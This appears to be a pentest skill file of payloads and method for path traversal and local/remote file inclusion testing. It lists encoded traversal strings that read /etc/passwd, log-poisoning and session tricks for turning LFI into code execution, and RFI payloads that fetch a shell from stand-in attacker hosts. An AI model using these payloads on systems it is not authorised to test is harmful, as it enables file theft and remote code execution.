---
name: path_traversal_lfi_rfi
description: File inclusion, path traversal, local/remote file inclusion
category: vulnerabilities
---

# Path Traversal & File Inclusion Testing

## Attack Surface
Path traversal allows reading arbitrary files on the server. LFI/RFI allows including local/remote files.
- File download endpoints: `?file=`, `?path=`, `?document=`
- Template inclusion parameters: `?page=`, `?view=`, `?template=`
- File upload handlers that overwrite system files
- Log file inclusion (LFI to RCE via log poisoning)

## Methodology
1. **Path Traversal Detection**
   - `../../../etc/passwd`
   - URL encoded: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`
   - Double encoding: `%252e%252e%252fetc%252fpasswd`
   - Unicode: `..%c0%af` (overlong UTF-8)
   - Null byte injection: `../../../etc/passwd%00`

2. **LFI to RCE**
   - PHP filter chains for code execution
   - Log poisoning: inject PHP code into logs, include the log file
   - `/proc/self/environ` poisoning via User-Agent
   - Session file inclusion: inject code via session data
   - SSH log poisoning for Linux targets

3. **Remote File Inclusion**
   - `http://attacker.com/shell.txt?`
   - `ftp://attacker.com/shell.txt`
   - SMB share inclusion: `\\attacker\share\shell`

## Validation
- File contents returned in response
- Error messages reveal file path information
- LFI leads to code execution via log poisoning
- RFI returns file from remote server
